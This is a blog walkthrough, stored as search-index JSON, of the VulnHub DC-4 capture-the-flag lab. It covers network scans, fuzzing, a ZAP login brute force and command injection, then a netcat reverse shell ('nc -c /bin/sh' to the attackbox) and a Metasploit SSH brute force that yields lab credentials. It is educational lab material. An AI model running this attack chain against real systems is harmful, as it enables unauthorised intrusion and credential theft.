[{"categories":["VulnHub"],"content":"DC-4 from the DC-Series(VulnHub).","date":"02-14-2024","objectID":"/dc-4/","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"If you’re wanting to learn SQLi and kernel exploitation, I’d suggest loading up DC-3. It showcased the importance of keeping your systems, internal and external, updated(patched). In the real world, keeping systems up-to-date can help deter attacks, by increasing the time and effort needed by the adversary, but can be difficult to implement. A vulnerability management framework can be a great step to a more secure infrastructure as it helps organize and implement remediation and mitigation efforts. In the end, if a system is critical to business operations and it cannot be patched, apply mitigations where possible, e.g., air-gaps, etc Anyways, onto DC-4! ","date":"02-14-2024","objectID":"/dc-4/:0:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"DC-4 Details Dropdown to see DC-4's quick overview DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues. Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools. For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward. Details can be found at https://www.vulnhub.com/entry/dc-4,313/ ⚠️ The creator of DC-4 seems to no longer have a working website, as of 2/5/24, so I’m also including the link to vulnhub above.⚠️ Original Home page: http://www.five86.com/dc-4.html ","date":"02-14-2024","objectID":"/dc-4/:1:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Configuring a Safe Network for DC-4 It’s important to create a safe environment for both your attackbox(e.g., Kali) and any vulnerable host(e.g., DC-4). ","date":"02-14-2024","objectID":"/dc-4/:2:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Creating a host-only virtual network Depending on your lab environment and the hypervisor in use, the way DC-4 is assigned an IP address will vary. In my current layout, I have DC-4 being hosted through vmware workstation pro which runs directly on my main “attackbox”(e.g., Kali). Since I’m working with a single VM, hosting directly on my attackbox is quicker and easier as it can provide features like drag and drop of files and a two way clipboard (useful when working with Windows hosts). FYI - DC-4 changes IP address mid-way FYI - DC-4 initially started with an IP of 192.168.0.128, but due to reloading DC-4 into VMware workstation, it later changes to 192.168.0.151. To create a new host-only virtual network for VMware Workstation, follow these steps: Open the vmware workstation network editor via terminal command vmware-netcfg. It may ask for your sudo password, as root privs are required. Click “Add Network” then select the desired number for the network host adapter name. To keep the DC-4 isolated and only accessible by the host machine(attackbox), Click “Host-only”. Enable “Use local DHCP service…”. This will assign DC-4 an IP address, within the private networkID we specify. Enter “Subnet IP” and “Subnet mask” values. I went with 192.168.0.0 and 255.255.255.0, which will provide a IP range of 192.168.0.1-254. Creating host-only virtual network on adapter vmnet4 ","date":"02-14-2024","objectID":"/dc-4/:2:1","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Assigning DC-4 to host-only virtual network Within DC-4’s VMware settings, assign DC-4 to the newly created host-only network. In this example, vmnet4 was created and assigned to DC-4’s network adapter. Make sure “Connected” and “Connect at power on” are enabled. Since we created a custom host-only adapter when creating the new virtual network, we’ll need to select “Custom” followed by the adapter name created previously. In this example, vmnet4 was created, so it was selected. Click “save” and power on the VM! Assign DC-4 to host-only network Why not use ‘Host-only: A private network shared with the host’ It’s a good habit to create separate virtual networks for different projects to prevent… E.g., Accidentally attacking a VM outside the project, etc. ","date":"02-14-2024","objectID":"/dc-4/:2:2","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Obtaining DC-4’s IP With DC-4 configured and powered on, it should be reachable by our “attackbox”. For clarification, I like to use the made up blanket term “attackbox” to refer to the system in which we’re attacking from. As it can be of ANY OS/distro, and not just Kali. There’s many ways of discovering devices on a network. arp, netdiscover, and nmap are just a few. I originally only included netdiscover for this writeup but I decided to also include arp and nmap examples. Don’t mind the different IPs in my terminal output. I’m writing this after the fact. ","date":"02-14-2024","objectID":"/dc-4/:3:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"arp for target discovery Open a new terminal Run arp -i \u003cinterface\u003e a. -i tells arp to run the request only on a specific interface. b. Replace \u003cinterface\u003e with the interface DC-4 is connected to. In my case that’s vmnet4. Quick overview of what ARP is doing… You attack an IP address but layer 2 hardware has to figure out what hardware ID(MAC address) is related to the IP address you’re attacking. This is where ARP comes into play. ARP is a layer 2 protocol in the OSI model and is responsible for translating IP addresses to MAC addresses, aka resolving a MAC address to an IP address. ARP requests and ARP replies are sent back and forth when a new device is added to a network or when a device can’t be found. To speed things up and to reduce network congestion, devices will use a local ARP table(cache) to remember recent translations. In the example screenshot below, you can see two IPs but only one has translated. DC-4’s 192.168.0.149 IP resolves to a MAC address, which was learned through the ARP protocol indicated by the “Flag Mask” value of C. BUT 192.168.0.20 has a (incomplete) HWaddress value. This means ARP is unable to find a device at IP 192.168.0.20, which is true. That was a host I was testing with and it no longer exists on the network. I’ve included a wireshark screenshot to show the ARP requests being sent to the router at 192.168.0.1, looking for a device at 192.168.0.20. arp scan example for vmnet4 ","date":"02-14-2024","objectID":"/dc-4/:3:1","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"netdiscover for target discovery Open a new terminal Run sudo netdiscover -i \u003cinterface\u003e -r \u003cip-range\u003e a. -i tells netdiscover to run the request only on the specified interface, vmnet4. b. -r allows you to specify what IP range to run against. I placed the NetworkID/CIDR for vmnet4. The terminal output will change soon after running netdiscover, followed by any discovered devices. 192.168.0.254 is vmnet4’s DHCP server. 192.168.0.128 is DC-4’s IP address, which is being assigned by vmnet4’s DHCP server. netdiscover works by sending ARP requests to every IP specified in the -r IP range. You can use the -p option to make netdiscover go into passive mode which only sniffs out ARP requests on the network. More can be found by running man netdiscover. netdiscover input command - example for vmnet4 netdiscover output - example for vmnet4 ","date":"02-14-2024","objectID":"/dc-4/:3:2","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"nmap for target discovery ping scan with Nmap Open a terminal Run nmap -sn \u003cnetworkID/CIDR\u003e a. -sn tells Nmap to only run a ping scan against the IP(s) specified and DISABLES port scan! b. \u003cnetworkID/CIDR\u003e is the IP(s) we want to scan. In my case, 192.168.0.0/24. nmap ping only - example for vmnet4 ARP scan with Nmap Open a terminal Run nmap -sn -PR \u003cnetworkID/CIDR\u003e a. -sn tells Nmap to only run a ping scan against the IP(s) specified and DISABLES port scan! b. -PR tells Nmap to run an ARP scan too. c. \u003cnetworkID/CIDR\u003e is the IP(s) we want to scan. In my case, 192.168.0.0/24. nmap ARP - example for vmnet4 ","date":"02-14-2024","objectID":"/dc-4/:3:3","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Set Environment Variables(Optional) Setting up environment variables can help ease the need of remembering an IP, etc. This step is optional, so feel free to skip to Nmap Scans. In this example, I’m using DC-4’s IP address. Change the IP as needed. export IP=\"192.168.0.128\" - exports DC-4’s IP address to variable $IP export URLdir=\"http://192.168.0.128/FUZZ/\" - exports URL for fuzzing directories with wfuzz export URLfile=\"http://192.168.0.128/FUZZ\" - export URL for fuzzing files with wfuzz echo $IP; echo $URLdir; echo $URLfile - returns exported vars, so we can verify their values environment variable assignments ","date":"02-14-2024","objectID":"/dc-4/:4:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Nmap Scans Now that we confirmed DC-4’s IP, we can move to port and service scans using Nmap. ","date":"02-14-2024","objectID":"/dc-4/:5:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Nmap all port scan To discover which ports may be open, run an all port scan against the target. nmap -p- -Pn \u003cDC-4 IP\u003e -p- - All 65,535 ports. -Pn - Scans hosts not responding to ping requests. Useful against Windows. In this scan, two ports are showing open. Port 22 - Running a SSH service Port 80 - Running a HTTP service nmap - all port scan ","date":"02-14-2024","objectID":"/dc-4/:5:1","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Nmap service scan Knowing which of the 65,535 ports are open can help focus the version/service scans and save lots of time. Run a service and versioning scan against the ports we confirmed were open. nmap -p 22,80 -sV -sC \u003cDC-4 IP\u003e -p - allows us to specify port ranges and/or individual ports. -sV - runs versioning checks on each service found. -sC - runs default scripts against each service found. nmap - service/version scan nmap reports back the following: Port 22 - SSH - OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) Port 80 - HTTP - nginx 1.15.10 Deciding which service to go after next all depends on what information you currently have. Unless this particular OpenSSH version has an easy and quick exploit, SSH is less attractive as we currently lack usernames and/or passwords, so attacking HTTP should be our next target. HTTP can provide us a way into the target, like a login panel. It can also leak sensitive data in an exposed directory and/or file. Hacker mindset With practice you’ll develop your own way of thinking and everyone gets that “ah ha” moment at different times. Anyways.. Upon further review of the nmap version and script results, a HTTP title was found with a label of “System Tools”. I’m already thinking.. Development panel with “System Tools”? Tools execute code. RCE? SSRF? Do admins access this? I should look for login panels or sensitive data. Point is… At every step, make a simple list of possible attack vectors and keep those thoughts SIMPLE! It’s very easy to find yourself in yet another rabbit hole, wasting precious time. To each their own, but when I find myself stuck or confused, I go do something else for a few minutes and come back to the problem. Most of the time, I’ll see where I turned the wrong direction in my thoughts and then things will usually ‘click’ for me. ","date":"02-14-2024","objectID":"/dc-4/:5:2","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Directory and File scans Since the target has outbound ports exposed to us and one is a nginx webserver running on port 80, scanning for hidden files and directories is a must! It could provide a better understanding of a possible attack path we could abuse and/or expose sensitive data from various files, e.g., administrator notes, cleartext passwords in a document, etc. Where we currently stand in our attack against DC-4, information is key! Remember I went ahead and exported both $URLfile and $URLdir environment variables. These are the following: $URLfile = http://192.168.0.128/FUZZ $URLdir = http://192.168.0.128/FUZZ/ ","date":"02-14-2024","objectID":"/dc-4/:6:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"wfuzz against files wfuzz is a fast, flexible fuzzing tool which I prefer over others as it can handle many different fuzzing attacks. But the fuzzer is only half the solution and you’ll need a good wordlist. For a solid wordlist resource, I recommend Daniel Miessler’s SecLists repo. In the command below, you’ll see which wordlist directory I like using for webapp file/directory fuzzing. Anyways, back to it! Run wfuzz against files in the root web directory. wfuzz -c --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt $URLfile -c - enables color output. --hc 404 - hides any response codes of 404, aka page not found. -w - specify wordlist location. $URLfile - exported variable from before. http://192.168.0.128/FUZZ. The FUZZ keyword acts as the payload locator. wfuzz - file scan Results from the root file fuzzing, which shows command.php but isn’t accessible (302 redirect). This may provide us a way to interact with a service or script? 000000001: 200 23 L 40 W 506 Ch “index.php” 000000004: 302 15 L 17 W 206 Ch “login.php” 000000156: 302 9 L 13 W 163 Ch “logout.php” 000000379: 301 7 L 11 W 170 Ch “.” 000002602: 302 24 L 67 W 704 Ch “command.php” ","date":"02-14-2024","objectID":"/dc-4/:6:1","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"wfuzz against directories Run wfuzz against directories in the root web directory. wfuzz -c --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt $URLdir -c - enables color output. --hc 404 - hides any response codes of 404, aka page not found. -w - specify wordlist location. $URLdir - exported variable from before. http://192.168.0.128/FUZZ. The FUZZ keyword acts as the payload locator. wfuzz - directory scan Directory results don’t show anything interesting: 000000015: 403 7 L 9 W 154 Ch “css” 000000002: 403 7 L 9 W 154 Ch “images” ","date":"02-14-2024","objectID":"/dc-4/:6:2","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"reviewing wfuzz results command.php looks interesting BUT we can’t access it as it redirects back to the /index.php page. /login.php and /logout.php also redirect back to /index.php page. A recursive fuzzing attack is possible, but we’ll keep that for later. It’s important to keep things simple and not to fall into rabbit holes! I’m going to move onto interacting with the web server using zaproxy. I may also search the HTTP header, “System Tools”, for common findings on google as it could relate to a specific kind of software. ","date":"02-14-2024","objectID":"/dc-4/:6:3","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Interacting with the web server Searching “System Tools” resulted in nothing useful on Google. At this point we could either spend time fuzzing more directories and files or we could check for abusable web server messages, login feedback, etc… Let’s go load up a proxy and check the HTTP messages! ","date":"02-14-2024","objectID":"/dc-4/:7:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Checking out the login panel Load up a web browser, with your favorite proxy, and launch zaproxy(or burpsuite, or whatever you’d like). Reviewing the /index.php response message shows us a login.php action with a post method, a username field, and a password field. A login panel! webserver - /index.php response Visiting the /index.php site, with our browser, shows the login panel we just found in the response message. Might as well check for username or password enumeration! Simply plug in some bogus data and hit submit. Then try again with “admin” and “administrator”. No feedback saying “invalid username” or “wrong password”, etc. Well good for the developer for making it safe from enumeration attacks but that won’t stop us! webserver - no login feedback Hacker mindset We’ve discovered a login panel that provides zero feedback upon failed login attempts and doesn’t seem to care that we’ve failed multiple login attempts. I’m thinking I’ll try these next few steps: Searchsploit nginx and ssh versions for anything abusable. If nothing… Attempt a brute-force attack hoping there’s no lockout policy. ","date":"02-14-2024","objectID":"/dc-4/:7:1","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Brute-forcing /login.php searchsploit came back with nothing useful on SSH 7.4p1 or nginx 1.15.10, so I’m moving onto a brute-force attack using zaproxy. So onto the setup…. ","date":"02-14-2024","objectID":"/dc-4/:8:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Setup brute-force attack in zaproxy I’ll be doing a “Cluster Bomb” attack, per the cool terminology of burpsuite, but through zaproxy as it does NOT have a rate limiter. This attack method iterates through a wordlist which assign to their own placeholder. zaproxy will try every possible combination between all wordlists, meaning the overall payload set can grow very large! With that in mind, I’ll be using smaller wordlists for both the username and password fields. Open zaproxy, along with a proxy configured browser pointing at /index.php: Input whatever placeholders you’d like into the username and password fields of the login panel. Click “login” while intercepting the POST request. Now open zaproxy to see a request message with your custom placeholders. In my example, username=FuzzUser and password=FuzzPassword. zaproxy - placeholders Open the fuzzing tool by going to “Tools” \u003e “Fuzz…”. A new window, labeled “Select Message”, will open. Select the POST request message “POST:login.php()(password,username)” and click “Select”. zaproxy - select correct message Now with the fuzzer tool opened, we want to add a wordlist to the first placeholder, which will apply to the username field. In my example, I’ll highlight “FuzzUser” and then click “Add…” zaproxy - highlight username then add You’ll see a new popup window labeled “Payloads”. Click “Add…” to open the “Add Payload” window. zaproxy - open payload window You should now see a window labeled “Add Payload”. To add the wordlist to the payload: a. Change the “Type:” from “Strings” to “File”. b. Click “Select…” c. Go find the payload you’d like to add for the username field. I used the following, which is located in the SecLists repo: /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt d. Once that’s loaded, you should see some of the desirable values in the “Payloads Preview” window. Next click “Add”. zaproxy - add username payload You should now see the first payload added into the “Payloads” list. This still only relates to the username field, meaning you can add multiple payloads per field! That pretty cool. Anyways, to finalize the username payloads, click “OK”. zaproxy - finalize username payload Now do the same exact steps for the password field. For reference, I used the following wordlist, from the SecLists repo, for the password payload: /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt After adding both username and password payloads, land yourself back at the “Fuzzer” window. You should have two fields loaded with payloads. zaproxy - fuzzer ready Attack speed matters! Be mindful of your attacks against login services! Being a CTF, it’s okay to attack without limiters but in a real penetration test, attacking without limits will result in a very negative outcome for everyone involved. Be mindful of your attack rates when brute-forcing login services. In zaproxy, you can change the attack rates from the “Fuzzer” window by clicking “Options” and then adjusting the “Delay when Fuzzing” and “Concurrent Scanning Threads per Scan” values. The screenshot lacks the values but I used 5000 Delay with 10 threads. Not sure how fast this attack can go without crashing a service, but this took about 15 minutes to finish since I had a total of 8500 requests to send. zaproxy - fuzzer options With everything prepped, start the attack by clicking “Start Fuzzer”! You’ll see the Fuzzer tab appear at the bottom of zaproxy and many requests being sent to the webserver. Lets start analyzing the results! ","date":"02-14-2024","objectID":"/dc-4/:8:1","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Analyzing the brute-force results So… what to look for?? A change from the 302 code. The response message will and should change byte sizes, even if small. Sometimes RTT can change value in milliseconds. With that in mind, lets click the “Code” column to organize the codes so that anything below 302 shows at the top. Upon review, I found the response and code values changed around the username:password values of admin:happy. zaproxy - fuzzer 302-200 results When looking at my 914th task, I found that admin:happy resulted in code “302 Found” BUT the response message showed a “You are currently logged in” value!! Success! zaproxy - fuzzer message results in success! The successful login happened during a 302 code but the continual 200 codes after indicate something significant occurred. By looking into the first 200 code, following the last 302, its message indicates we’re already logged in but the last 302 is what contains the successful login attempt. The point here is to check the message contents for indicators of success and only use code or byte values as a guide when sifting through results. ","date":"02-14-2024","objectID":"/dc-4/:8:2","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Abusing the “System Tools” toolbox We have found working credentials! First task is to login and see if we can access the command.php site we found earlier. ","date":"02-14-2024","objectID":"/dc-4/:9:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Probing command.php Let’s begin with logging in via /index.php using admin:happy credentials. Success! webserver - attempting login webserver - login success! Now that we’re logged in, we see a “Command” hyperlink leading to the command.php site! webserver - accessing command.php If we select the radio button labeled “List Files” and then click “Run”, we can see that the webpage responds with the output results of the ls cli command listing a directory from the webserver! If we’re able to change the values of any radio button, we will have code injection(CI) on the server! webserver - checking out command.php ","date":"02-14-2024","objectID":"/dc-4/:9:1","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Abusing command.php for code injection Well enough fun in the web browser… Let’s (re)open zaproxy and see what’s actually going on with the server messages. If we’re lucky, we’ll be able to change the values of a radio button without the server knowing any better. This is a result of not properly coding command.php and allowing user input to pass. Upon running the “List Files” command and intercepting within zaproxy, we can see that the CLI commands are indeed being passed to the server! webserver - command.php request Let’s go ahead and send this request message over to “Requester”. “Requester” is burpsuite’s “Repeater”. It allows you to send a custom message over and over at will. With the previous request message opened, click on the toolbar menu “Tools” then “Open message in requester tab…”. You should land on the requester tab with the previous request message opened inside. webserver - zaproxy requester Lets change the radio button’s value from ls+-l to pwd, then click “Send”. You’ll see the server response on the bottom right. Scroll down and you should see /usr/share/nginx/html. We have code injection! webserver - zaproxy confirmed CI Upon running cat /etc/passwd, I found the following users: charles jim sam I then run whoami to find out what user the webserver is running under and it’s www-data. Since www-data isn’t listed as a 1000+ user, they’re not a user we can login as. We’ll have to get access through this CI method, which is fine as it should be pretty straight forward. ","date":"02-14-2024","objectID":"/dc-4/:9:2","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Gaining a shell as www-data Before we run a netcat(nc) command to land a reverse shell, let’s make sure the binary exists on the target host by injecting: type nc webserver - search for nc binary The target has the nc binary in the /bin/ directory but do we have execution privileges? Inject the following: ls -l /bin/nc webserver - privilege confirmed to nc binary We do have execution privileges as www-data and since our attackbox resides on the same subnet as DC-4, we can simply do the following to land a reverse shell: Open a new terminal on the attackbox and start a nc listener: nc -nvlp 10000 nc - executes the nc binary on our attackbox -n - disables DNS -v - verbose mode -l - listen mode -p - let’s us specify the port to listen on 10000 - port 10000 we’ll listen on webserver - setup nc listener Prep the following code into the radio button’s value: nc -c /bin/sh 192.168.0.1 10000 nc - executes the nc binary -c - tells nc to execute a shell command /bin/sh - shell command to execute, in this case… open a shell 192.168.0.1 - IP of my attackbox, where a nc listener is ready on port 10000 10000 - the attackbox port to connect to webserver - zaproxy code injection to revshell With the listener running and the code injection ready, click “Send” in zaproxy and watch our listener connect to DC-4’s IP. To confirm we’re connected, which directory we’re currently working out of, etc, I ran a few extra commands in the example below. reverse shell established NOTE: When it comes to reverse shells, you’ll want to leave any process, associated with the reverse shell, alone. Disrupting the connection, by cancelling or exiting an associated program, could and probably will cause the reverse shell to disconnect. With a reverse shell established, we should look into upgrading it to a stable shell. We lack tty and hitting CTRL+C will cause the reverse shell to exit. ","date":"02-14-2024","objectID":"/dc-4/:9:3","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Upgrading the reverse shell Start by checking if python is present on DC-4: which python which - searches directories listed in $PATH python - binary to search for With python present, next spawn a python shell: python -c 'import pty; pty.spawn(\"/bin/bash\")' python -c - executes python binary with the command option import pty; - imports module “pty” then executes… pty.spawn(\"/bin/bash\") - spawns a new bash process in the controlling terminal By habit I set $PATH, so we can reach binaries with ease but it wasn’t needed as $PATH was already set. export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp Set terminal output to have color: export TERM=xterm-256color Next let’s set a environment variable, which is very helpful when enumerating files: alias ll='ls -lsaht --color=auto' alias ll - alias name to set in the environment ls -lsaht - executes ls with options -lsaht --color=auto - gives us color in the terminal output Background your shell with nc by keyboard shortcut: CTRL+Z Next we change the echo setting to disabled and reopen the foregrounded tty(Press enter twice!): stty raw -echo;fg;reset stty raw -echo - disables our terminal echo meaning CTRL+C won’t exit our reverse shell, autocomplete turns on, arrows will work, etc fg;reset - foregrounds the shell and reset provides us output again Set terminal columns and row maximums: stty columns 200 rows 200 reverse shell - stable shell Now with a stable reverse shell into DC-4, it’s time to enumerate DC-4. In the real world, we’d not only escalate within the ROE, but we’d start collecting any sensitive data moving forward. Hacker mindset With a shell gained on DC-4, I’m going to start enumeration with the previously found users, particularly the home folders of: charles, jim, and sam. ","date":"02-14-2024","objectID":"/dc-4/:9:4","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Enumerating DC-4 Enumerating a new system is usually done thoroughly, using many different manual techniques and automation tools. Gathering as you go is a tactic but depending on your time limit, ROE, the clients needs, etc you’ll have to adjust accordingly. Since we’re dealing with a CTF, attacks are usually directed and unwanted data isn’t usually present on the target. ","date":"02-14-2024","objectID":"/dc-4/:10:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Digging into user home folders After digging around DC-4, user jim has some interesting files located in his home directory. enumerate DC-4 - jim’s home After digging around, I found a old-passwords.bak file located in /home/jim/backup. It looks to contain old passwords jim may have used? enumerate DC-4 - jim’s passwords There’s also a mbox file, which www-data lacks permission to open. This is something to notate and check out later if and when we get permissions to. enumerate DC-4 - jim’s mbox file Hacker mindset Now that we have a list of passwords, I can try attacking two possible login paths: su or ssh. I’m going to attempt to automate login attempts on ssh using msfconsole’s module: ssh-login. ","date":"02-14-2024","objectID":"/dc-4/:10:1","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Attacking SSH With a list of clear text passwords residing in a directory under the user “jim”, we’ll use that list to automate ssh logins. This will be done using Metasploit’s “ssh-login” module. Maybe jim is reusing old passwords or another user is using this password list? ","date":"02-14-2024","objectID":"/dc-4/:11:0","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"msfconsole and ssh-login First create two lists: contents of the “old-passwords.bak” file list containing each possible user: jim, sam, charles, root Both lists should use a one-per-line format Next load up metasploit by opening a new terminal and running msfconsole. msfconsole - open console Once loaded and at the “MSF” terminal, search for ssh_login by running: search ssh_login Of the few results, select ssh_login but typing in use #, replacing # with the corresponding number of the result which does NOT include _pubkey in it’s result. Below, I enter use 0. msfconsole - open ssh_login scanner/ssh/ssh_login prompt should be active now and we can start editing the auxiliary module’s options. To see the current options, run options. To set the needed options, run the following: set USER_FILE \u003cusers.txt\u003e - username file we created earlier set PASS_FILE \u003cpw.txt\u003e - password file we extracted earlier set RHOST 192.168.0.151 - remote host we’re attacking.. DC-4’s IP set VERBOSE True - enables feedback on failed and successful login attempts options - review what is set and compare to below msfconsole - options set and ready With the ssh_login module ready, enter run into the terminal and watch it slowly automate our ssh logins! msfconsole - ssh login success We land a successful login with the following credentials: jim:jibril04 Hacker mindset Simple. We check if our new found SSH creds authenticate to DC-4 through the open SSH service on port 22. Also, don’t forget to check if we can access that mbox file which www-data didn’t have privs to. ","date":"02-14-2024","objectID":"/dc-4/:11:1","tags":["CTF (self-hosted)","Fuzzing","ZAP","wfuzz","Brute-force","Sudo abuse","nmap","Metasploit","Enumeration"],"title":"DC-4 of the DC Series","uri":"/dc-4/"},{"categories":["VulnHub"],"content":"Accessing DC-4 as “jim” Open a new terminal and login as “jim”, using the credentials we just found. jim:jibril04 Congrats! You just made a lateral move on DC-4 and this may open new attack paths. Let’s go explore what jim has access to! First thing I check for is history as it will print jim’s history list. It’s always worth checking but this time round no results. jim - history Next is checking jim’s sudo privs by running sudo -l. Looks like jim is NOT a part of the sudoers group, so no potential easy sudo exploits. jim - not a part of sudoers group Remember the mbox file? Let’s try to cat out its content! Nothing useful found but this makes me wonder if there’s any mbox files within the webservers var directory. jim - cat mbox file Navigate to the /var/mail/ directory and ls -lsaht its contents. To break down the ls -lsaht options for you… l - use long listing format s - prints the allocated size of each file a - lists all files h - enables human readable data sizes t - sorts by modification time Looks like we have read/write permissions to a file named “jim”. As it’s located in the /var/mail/ directory, lets see if it holds anything useful for our attack! jim - cat jim file Bingo! The contents of this email possesses a password from the user charles! ^xHhA\u0026hvim0y Hacker mindset In a real engagement, you’d want to run any found passwords against all users to test for poor password management. As this is a simple CTF, I’ll check if it allows me to login as charles. Charles seems to have higher privs than jim, so maybe it’ll allow me to dig deeper into DC-4. 